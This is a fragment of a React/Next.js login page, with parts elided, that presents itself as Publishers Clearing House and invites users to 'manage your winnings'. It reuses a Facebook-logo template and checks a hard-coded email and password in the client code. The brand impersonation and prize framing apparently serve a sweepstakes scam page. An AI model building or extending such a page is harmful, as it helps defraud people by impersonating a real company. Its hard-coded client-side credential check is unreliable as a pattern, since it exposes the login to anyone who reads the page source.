...
export default function LoginPage() {
  ...
  const handleLogin = async () => {
    try {
      if (email === "Worldbankofficial93@gmail.com" && password === "Jamie123") {
      ...
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-blue-600 via-blue-500 to-blue-700 text-white">
        <div className="w-[90%] mx-auto lg:w-[350px] md:w-[500px] lg:mx-auto md:mx-auto rounded-xl shadow-lg bg-opacity-50 backdrop-blur-md bg-blue-800/60 p-6 ml-5">
          <div className="text-center mb-6">
            <Image
              src="/pch.png" // Add your Facebook logo in the public folder
              alt="Facebook Log"
              width={50}
              height={50}
              className="mx-auto"
            />
            <h1 className="text-xl font-bold mt-4">Publishers Clearing House</h1>
            <p className="mt-2 text-blue-200">
              Log in to manage your winnings.
            </p>
          </div>
          <form
            onSubmit={(e) => {
